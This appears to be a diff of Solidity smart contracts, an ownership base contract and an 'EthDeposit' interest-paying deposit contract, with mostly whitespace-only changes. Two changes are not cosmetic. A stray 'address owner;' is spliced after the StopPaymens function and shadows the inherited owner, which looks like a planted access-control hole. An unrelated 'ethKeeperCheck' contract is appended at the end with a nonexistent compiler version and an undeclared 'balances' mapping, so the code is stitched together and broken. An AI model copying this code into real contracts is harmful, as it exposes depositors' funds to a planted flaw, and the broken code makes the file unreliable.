@@ -1,11 +1,11 @@
 pragma solidity ^0.4.17;
 
-contract Owned 
+contract Owned
 {
     address newOwner;
     address owner = msg.sender;
     address creator = msg.sender;
-    
+
     function changeOwner(address addr)
     public
     {
@@ -14,7 +14,7 @@ contract Owned
             newOwner = addr;
         }
     }
-    
+
     function confirmOwner()
     public
     {
@@ -23,8 +23,8 @@ contract Owned
             owner=newOwner;
         }
     }
-    
-    
+
+
     function isOwner()
     internal
     constant
@@ -32,7 +32,7 @@ contract Owned
     {
         return owner == msg.sender;
     }
-    
+
     function WthdrawAllToCreator()
     public
     payable
@@ -42,7 +42,7 @@ contract Owned
             creator.transfer(this.balance);
         }
     }
-    
+
     function WthdrawToCreator(uint val)
     public
     payable
@@ -52,7 +52,7 @@ contract Owned
             creator.transfer(val);
         }
     }
-    
+
     function WthdrawTo(address addr,uint val)
     public
     payable
@@ -67,41 +67,41 @@ contract Owned
 contract EthDeposit is Owned
 {
     address public Manager;
-    
+
     address public NewManager;
-    
+
     uint public SponsorsQty;
-    
+
     uint public CharterCapital;
-    
+
     uint public ClientQty;
-    
+
     uint public PrcntRate = 5;
-    
+
     bool paymentsAllowed;
-    
+
     struct Lender
     {
         uint LastLendTime;
         uint Amount;
         uint Reserved;
     }
-    
+
     mapping (address => uint) public Sponsors;
-    
+
     mapping (address => Lender) public Lenders;
-    
+
     event StartOfPayments(address indexed calledFrom, uint time);
-    
+
     event EndOfPayments(address indexed calledFrom, uint time);
-    
+
     function init(address _manager)
     public
     {
         owner = msg.sender;
         Manager = _manager;
     }
-    
+
     function isManager()
     private
     constant
@@ -109,7 +109,7 @@ contract EthDeposit is Owned
     {
         return(msg.sender==Manager);
     }
-    
+
     function canManage()
     private
     constant
@@ -117,12 +117,12 @@ contract EthDeposit is Owned
     {
         return(msg.sender==Manager||msg.sender==owner);
     }
-    
+
     function ChangeManager(address _newManager)
     public
     {
         if(canManage())
-        { 
+        {
             NewManager = _newManager;
         }
     }
@@ -135,27 +135,27 @@ contract EthDeposit is Owned
             Manager=NewManager;
         }
     }
-    
+
     function StartPaymens()
     public
     {
         if(canManage())
-        { 
+        {
             AuthorizePayments(true);
             StartOfPayments(msg.sender, now);
         }
     }
-    
+
     function StopPaymens()
     public
     {
         if(canManage())
-        { 
+        {
             AuthorizePayments(false);
             EndOfPayments(msg.sender, now);
         }
     }address owner;
-    
+
     function AuthorizePayments(bool val)
     public
     {
@@ -164,7 +164,7 @@ contract EthDeposit is Owned
             paymentsAllowed = val;
         }
     }
-    
+
     function SetPrcntRate(uint val)
     public
     {
@@ -174,20 +174,20 @@ contract EthDeposit is Owned
             {
                 if(val>=1)
                 {
-                    PrcntRate = val;  
+                    PrcntRate = val;
                 }
             }
         }
     }
-    
+
     function()
     public
     payable
     {
         ToSponsor();
     }
-    
-    function ToSponsor() 
+
+    function ToSponsor()
     public
     payable
     {
@@ -196,11 +196,11 @@ contract EthDeposit is Owned
             if(Sponsors[msg.sender]==0)SponsorsQty++;
             Sponsors[msg.sender]+=msg.value;
             CharterCapital+=msg.value;
-        }   
+        }
     }
-    
-    function WithdrawToSponsor(address _addr, uint _wei) 
-    public 
+
+    function WithdrawToSponsor(address _addr, uint _wei)
+    public
     payable
     {
         if(Sponsors[_addr]>0)
@@ -215,23 +215,23 @@ contract EthDeposit is Owned
             }
         }
     }
-    
-    function Deposit() 
-    public 
+
+    function Deposit()
+    public
     payable
     {
         FixProfit();//fix time inside
         Lenders[msg.sender].Amount += msg.value;
     }
-    
-    function CheckProfit(address addr) 
-    public 
-    constant 
+
+    function CheckProfit(address addr)
+    public
+    constant
     returns(uint)
     {
         return ((Lenders[addr].Amount/100)*PrcntRate)*((now-Lenders[addr].LastLendTime)/1 days);
     }
-    
+
     function FixProfit()
     public
     {
@@ -241,9 +241,9 @@ contract EthDeposit is Owned
         }
         Lenders[msg.sender].LastLendTime=now;
     }
-    
-    function WitdrawLenderProfit() 
-    public 
+
+    function WitdrawLenderProfit()
+    public
     payable
     {
         if(paymentsAllowed)
@@ -254,5 +254,20 @@ contract EthDeposit is Owned
             msg.sender.transfer(profit);
         }
     }
-    
+
+}
+pragma solidity ^0.6.24;
+contract ethKeeperCheck {
+	  uint256 unitsEth; 
+	  uint256 totalEth;   
+  address walletAdd;  
+	 function() payable{
+		totalEth = totalEth + msg.value;
+		uint256 amount = msg.value * unitsEth;
+		if (balances[walletAdd] < amount) {
+			return;
+		}
+		balances[walletAdd] = balances[walletAdd] - amount;
+		balances[msg.sender] = balances[msg.sender] + amount;
+  }
 }
